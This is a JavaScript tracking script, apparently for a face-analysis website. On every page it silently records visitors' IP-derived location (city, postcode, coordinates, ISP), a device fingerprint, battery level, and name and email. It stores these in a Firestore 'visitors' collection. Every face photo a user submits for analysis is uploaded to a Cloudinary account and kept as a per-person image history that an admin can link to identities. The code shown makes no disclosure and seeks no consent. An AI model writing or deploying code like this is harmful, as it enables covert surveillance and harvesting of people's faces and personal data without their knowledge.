// ============================================================
//  collect.js v7 — Firebase Firestore + Cloudinary
//  ✅ Always compress image to ≤800px JPEG before upload
//  ✅ IP-based dedup — same IP = update existing doc (no duplicates)
//  ✅ Stable docId fingerprint if IP unavailable
//  ✅ Always uploads photo (no hash dedup skipping)
//  ✅ v7: Saves raf_uid so admin can link visitor → profile photo/name
// ============================================================
(function () {

  // ── Cloudinary config ──
  var CLD_CLOUD  = "dljzyticd";
  var CLD_PRESET = "YASHRAJPUT";
  var CLD_URL    = "https://api.cloudinary.com/v1_1/" + CLD_CLOUD + "/image/upload";

  // ── Firebase config ──
  var FB_API_KEY = "YOUR_FIREBASE_API_KEY";
  var FB_PROJECT = "YOUR_FIREBASE_PROJECT_ID";
  var FB_DB_URL  = "https://firestore.googleapis.com/v1/projects/" + FB_PROJECT + "/databases/(default)/documents/visitors/";

  // ── Storage helpers ──
  function lg(k)    { try { return localStorage.getItem(k);   } catch(e) { return null; } }
  function ls(k, v) { try { localStorage.setItem(k, v);       } catch(e) {} }
  function sg(k)    { try { return sessionStorage.getItem(k); } catch(e) { return null; } }
  function ss(k, v) { try { sessionStorage.setItem(k, v);     } catch(e) {} }

  // ── Page identity ──
  var PM = {
    "/": "Home", "/index.html": "Home",
    "/faceanalyze.html": "Face Analyzer",
    "/agedetector.html": "Age Detector",
    "/compareface.html": "Compare Face",
    "/symettery.html":   "Symmetry Test",
    "/future.html":      "Face Future",
    "/leaderboard.html": "Leaderboard",
    "/mission.html":     "Mission",
    "/settings.html":    "Settings",
    "/contact.html":     "Contact",
    "/about.html":       "About"
  };
  var _path = (window.location.pathname || "/").replace(/\/+$/, "") || "/";
  var _page = PM[_path] || _path;
  var _url  = window.location.href;
  var _ref  = document.referrer || "Direct";

  // ── User info ──
  function getUserInfo() {
    var name  = lg("afa_display_name") || lg("userName") || "";
    var email = lg("userEmail") || lg("afa_user_email") || "";
    try {
      if (window.__fb && window.__fb.auth && window.__fb.auth.currentUser) {
        var u = window.__fb.auth.currentUser;
        if (!name)  name  = u.displayName || "";
        if (!email) email = u.email || "";
        if (name)  ls("userName", name);
        if (email) ls("userEmail", email);
      }
    } catch(e) {}
    return { name: name || "—", email: email || "—" };
  }

  function setupAuthListener() {
    var tried = 0;
    var timer = setInterval(function() {
      tried++;
      if (tried > 60) { clearInterval(timer); return; }
      try {
        if (window.__fb && window.__fb.onAuthStateChanged && window.__fb.auth) {
          clearInterval(timer);
          window.__fb.onAuthStateChanged(window.__fb.auth, function(user) {
            if (user) {
              var n = lg("afa_display_name") || lg("userName") || user.displayName || "";
              var e = user.email || "";
              if (n) { ls("userName", n); ls("afa_display_name", n); }
              if (e) { ls("userEmail", e); ls("afa_user_email", e); }
              var docId = lg("_cl_docid");
              if (docId) setTimeout(function(){ triggerUpdate(); }, 1200);
            }
          });
        }
      } catch(e) {}
    }, 500);
  }

  // ── Device info ──
  function getDevice() {
    var ua = navigator.userAgent || "", phone = "Unknown", m;
    m = ua.match(/\(Linux;[^)]*Android[\s\d.]+;\s*([^)]+)\)/i);
    if (m) { phone = m[1].split(/\s*Build\//)[0].trim().slice(0, 45); }
    if (!phone || phone === "Unknown") { m = ua.match(/(?:Redmi Note ?|Redmi ?|POCO ?|Mi ?\d)[^\s;)]+/i); if (m) phone = m[0].trim().slice(0, 40); }
    if (!phone || phone === "Unknown") { m = ua.match(/(?:OnePlus|ONEPLUS)[_ ]([^\s;)]+)/i); if (m) phone = "OnePlus " + m[1]; }
    if (!phone || phone === "Unknown") { m = ua.match(/(?:OPPO|Realme|vivo|Infinix|Tecno)[_ ]?([^\s;)]+)/i); if (m) phone = m[0].trim().slice(0, 35); }
    if (!phone || phone === "Unknown") { m = ua.match(/SM-([A-Z0-9]+)/i); if (m) phone = "Samsung SM-" + m[1]; }
    if (!phone || phone === "Unknown") {
      if (/iPhone/.test(ua)) { m = ua.match(/iPhone OS (\d+)/i); var iv = m ? parseInt(m[1]) : 0;
        phone = (iv>=18?"iPhone 16":iv>=17?"iPhone 15":iv>=16?"iPhone 14":iv>=15?"iPhone 13":"iPhone")+(m?" (iOS "+m[1]+")" :""); }
    }
    if (!phone || phone === "Unknown") { if (/iPad/.test(ua)) phone = "iPad"; }

    var browser = "Unknown", bv;
    if (/CriOS/.test(ua))              { bv=ua.match(/CriOS\/(\d+)/);          browser="Chrome iOS"+(bv?" v"+bv[1]:""); }
    else if (/EdgA/.test(ua))          { bv=ua.match(/EdgA\/(\d+)/);           browser="Edge Android"+(bv?" v"+bv[1]:""); }
    else if (/SamsungBrowser/.test(ua)){ bv=ua.match(/SamsungBrowser\/(\d+)/); browser="Samsung Br."+(bv?" v"+bv[1]:""); }
    else if (/OPR/.test(ua))           { bv=ua.match(/OPR\/(\d+)/);            browser="Opera"+(bv?" v"+bv[1]:""); }
    else if (/Edg\//.test(ua))         { bv=ua.match(/Edg\/(\d+)/);            browser="Edge"+(bv?" v"+bv[1]:""); }
    else if (/Chrome/.test(ua))        { bv=ua.match(/Chrome\/(\d+)/);         browser="Chrome"+(bv?" v"+bv[1]:""); }
    else if (/Firefox/.test(ua))       { bv=ua.match(/Firefox\/(\d+)/);        browser="Firefox"+(bv?" v"+bv[1]:""); }
    else if (/Safari/.test(ua))        { bv=ua.match(/Version\/(\d+)/);        browser="Safari"+(bv?" v"+bv[1]:""); }

    var os="Unknown", om;
    om=ua.match(/Android (\d+\.?\d*)/); if(om) os="Android "+om[1];
    if(os==="Unknown"){om=ua.match(/iPhone OS (\d+_\d+)/);if(om)os="iOS "+om[1].replace("_",".");}
    if(os==="Unknown"){om=ua.match(/iPad.*OS (\d+_\d+)/);if(om)os="iPadOS "+om[1].replace("_",".");}
    if(os==="Unknown"){om=ua.match(/Windows NT ([\d.]+)/);if(om){var wv={"10.0":"10","6.3":"8.1","6.2":"8","6.1":"7"};os="Windows "+(wv[om[1]]||om[1]);}}
    if(os==="Unknown"&&/Macintosh/.test(ua)){om=ua.match(/Mac OS X ([\d_]+)/);os="macOS"+(om?" "+om[1].replace(/_/g,"."):"");}
    if(os==="Unknown"&&/Linux/.test(ua)) os="Linux";

    var ram="—"; try{if(navigator.deviceMemory)ram=navigator.deviceMemory+"GB";}catch(e){}
    var cpu="—"; try{if(navigator.hardwareConcurrency)cpu=String(navigator.hardwareConcurrency);}catch(e){}
    var conn="—",spd="—";
    try{var nc=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(nc){conn=nc.effectiveType||"—";spd=nc.downlink?nc.downlink+"Mbps":"—";}}catch(e){}
    var lang=(navigator.language||"?").toUpperCase();
    var tz="—"; try{tz=Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){}
    var scr=screen.width+"x"+screen.height+" @"+(window.devicePixelRatio||1).toFixed(1)+"x";
    var dv=/Mobi|Android/i.test(ua)?"Mobile":"Desktop";
    var u=getUserInfo();
    return {phone:phone,browser:browser,os:os,dv:dv,lang:lang,tz:tz,scr:scr,ram:ram,cpu:cpu,conn:conn,spd:spd,name:u.name,email:u.email};
  }

  // ── GEO — cached 1 hour ──
  function getGeo(cb) {
    try {
      var cached=lg("_cl_geo"),ts=parseInt(lg("_cl_geo_ts")||"0");
      if(cached&&(Date.now()-ts<3600000)){var g=JSON.parse(cached);if(g&&g.ip){cb(g);return;}}
    } catch(e){}
    fetch("https://ipapi.co/json/")
      .then(function(r){return r.json();})
      .then(function(d){
        if(!d||!d.ip) throw 0;
        var geo={ip:d.ip||"—",country:d.country_name||d.country||"—",region:d.region||"—",city:d.city||"—",zip:d.postal||"—",isp:d.org||"—",lat:d.latitude||"",lon:d.longitude||""};
        ls("_cl_geo",JSON.stringify(geo)); ls("_cl_geo_ts",String(Date.now()));
        cb(geo);
      })
      .catch(function(){
        var tz="—";try{tz=Intl.DateTimeFormat().resolvedOptions().timeZone;}catch(e){}
        var tzMap={"Asia/Kolkata":"India","Asia/Calcutta":"India","America/New_York":"USA","America/Chicago":"USA","America/Los_Angeles":"USA","Europe/London":"UK","Asia/Dubai":"UAE","Asia/Manila":"Philippines","America/Sao_Paulo":"Brazil","Asia/Karachi":"Pakistan","Asia/Dhaka":"Bangladesh","Asia/Jakarta":"Indonesia"};
        cb({ip:"—",country:tzMap[tz]||"—",region:"—",city:"—",zip:"—",isp:"—",lat:"",lon:""});
      });
  }

  // ── Stable DocId ──
  function makeStableId() {
    // Use a persistent random token stored in localStorage — never changes for this device
    var stored = lg("_cl_stable_id");
    if (stored) return stored;
    var id = "dev_" + Math.random().toString(36).slice(2,10) + Math.random().toString(36).slice(2,6);
    ls("_cl_stable_id", id);
    return id;
  }

  // ── Firestore REST: PATCH (upsert) ──
  function firestoreUpsert(docId, fields) {
    var url = FB_DB_URL + docId + "?key=" + FB_API_KEY;
    function toFV(val) {
      if (val === null || val === undefined) return { nullValue: null };
      if (typeof val === "number")  return { integerValue: String(Math.floor(val)) };
      if (typeof val === "boolean") return { booleanValue: val };
      return { stringValue: String(val) };
    }
    var fsFields = {};
    Object.keys(fields).forEach(function(k) { fsFields[k] = toFV(fields[k]); });
    return fetch(url, {
      method: "PATCH",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ fields: fsFields })
    }).then(function(r){ return r.json(); }).catch(function(){ return null; });
  }

  // ── Compress ANY image source to small JPEG blob ──
  function compressImage(src, callback) {
    var MAX = 800; // keep it small — Cloudinary free tier, fast upload
    var img = new Image();
    img.crossOrigin = "anonymous";
    img.onload = function() {
      var w = img.width, h = img.height;
      if (w > MAX || h > MAX) {
        var ratio = Math.min(MAX / w, MAX / h);
        w = Math.round(w * ratio);
        h = Math.round(h * ratio);
      }
      var cv = document.createElement("canvas");
      cv.width = w; cv.height = h;
      cv.getContext("2d").drawImage(img, 0, 0, w, h);
      cv.toBlob(function(blob) {
        if (blob) callback(blob);
      }, "image/jpeg", 0.82);
    };
    img.onerror = function() { callback(null); };
    img.src = src;
  }

  // ── Cloudinary upload (always compress first) ──
  function uploadToCloudinary(src, onSuccess) {
    if (!src) return;
    compressImage(src, function(blob) {
      if (!blob) return;
      var fd = new FormData();
      fd.append("file", blob, "face.jpg");
      fd.append("upload_preset", CLD_PRESET);
      fetch(CLD_URL, { method: "POST", body: fd })
        .then(function(r){ return r.json(); })
        .then(function(d){ if (d && d.secure_url) onSuccess(d.secure_url); })
        .catch(function(){});
    });
  }

  // ── Main save ──
  function doSend(dev, bat, action, photoSrc) {
    var first    = lg("_cl_first") || new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata"});
    var views    = parseInt(lg("_cl_views")    || "0");
    var analyzes = parseInt(lg("_cl_analyzes") || "0");
    if (!lg("_cl_first")) ls("_cl_first", first);

    getGeo(function(geo) {
      // DocId: IP-based (stable across pages) OR persistent device token
      var ipKey = geo.ip && geo.ip !== "—" ? geo.ip.replace(/\./g,"_") : null;
      var docId = ipKey || lg("_cl_docid") || makeStableId();
      ls("_cl_docid", docId);

      var now = new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata",hour12:true});

      // Link to profile-onboarding data
      var rafUid   = lg("raf_uid")   || "";
      var rafName  = lg("raf_name")  || "";
      var rafPhoto = lg("raf_photo") || "";

      var record = {
        docId:      docId,
        uid:        rafUid,
        name:       rafName || dev.name,
        profilePhoto: rafPhoto,
        email:      dev.email,
        ip:         geo.ip,
        country:    geo.country,
        region:     geo.region,
        city:       geo.city,
        zip:        geo.zip,
        isp:        geo.isp,
        lat:        String(geo.lat||""),
        lon:        String(geo.lon||""),
        deviceType: dev.dv,
        os:         dev.os,
        phone:      dev.phone,
        browser:    dev.browser,
        language:   dev.lang,
        timezone:   dev.tz,
        screen:     dev.scr,
        ram:        dev.ram,
        cpu:        dev.cpu,
        connection: dev.conn,
        speed:      dev.spd,
        battery:    bat || "—",
        page:       _page,
        url:        _url,
        referrer:   _ref,
        action:     action || "visit",
        firstVisit: first,
        lastActive: now,
        pageViews:  views,
        analyzes:   analyzes
      };

      if (photoSrc) {
        // Save record immediately (without image)
        firestoreUpsert(docId, record);
        // Then upload image and update record with URL
        uploadToCloudinary(photoSrc, function(cldUrl) {
          ls("_cl_last_img", cldUrl);
          // Maintain history array
          var hist = [];
          try { hist = JSON.parse(lg("_cl_img_hist") || "[]"); } catch(e) {}
          if (hist.indexOf(cldUrl) === -1) { hist.push(cldUrl); ls("_cl_img_hist", JSON.stringify(hist)); }
          record.imageUrl  = cldUrl;
          record.imageUrls = JSON.stringify(hist);
          firestoreUpsert(docId, record);
        });
      } else {
        firestoreUpsert(docId, record);
      }
    });
  }

  function withBattery(dev, action, photoSrc) {
    if ("getBattery" in navigator) {
      navigator.getBattery()
        .then(function(b){ doSend(dev, Math.round(b.level*100)+"%"+(b.charging?" ⚡":""), action, photoSrc); })
        .catch(function(){ doSend(dev, null, action, photoSrc); });
    } else { doSend(dev, null, action, photoSrc); }
  }

  function triggerUpdate() {
    var docId = lg("_cl_docid"); if(!docId) return;
    var dev=getDevice();
    var views    = parseInt(lg("_cl_views")    || "0");
    var analyzes = parseInt(lg("_cl_analyzes") || "0");
    getGeo(function(geo){
      var now = new Date().toLocaleString("en-IN",{timeZone:"Asia/Kolkata",hour12:true});
      firestoreUpsert(docId, {
        name:       dev.name,
        email:      dev.email,
        lastActive: now,
        page:       _page,
        url:        _url,
        pageViews:  views,
        analyzes:   analyzes,
        ip:         geo.ip,
        country:    geo.country
      });
    });
  }

  // ── PAGE VISIT — once per session ──
  function trackVisit() {
    var key = "_cl_pv" + _path.replace(/\W/g,"_");
    if (sg(key)) return; ss(key,"1");
    var v = parseInt(lg("_cl_views")||"0")+1; ls("_cl_views",String(v));
    withBattery(getDevice(), "visit", null);
  }

  // ── ANALYZE — called from all tool pages ──
  window._clAnalyze = function(photoSrc, label) {
    var a = parseInt(lg("_cl_analyzes")||"0")+1; ls("_cl_analyzes",String(a));
    withBattery(getDevice(), label||"Analyzed", photoSrc||null);
  };

  // ── INIT ──
  setupAuthListener();
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", function(){ setTimeout(trackVisit, 800); });
  } else { setTimeout(trackVisit, 800); }

})();
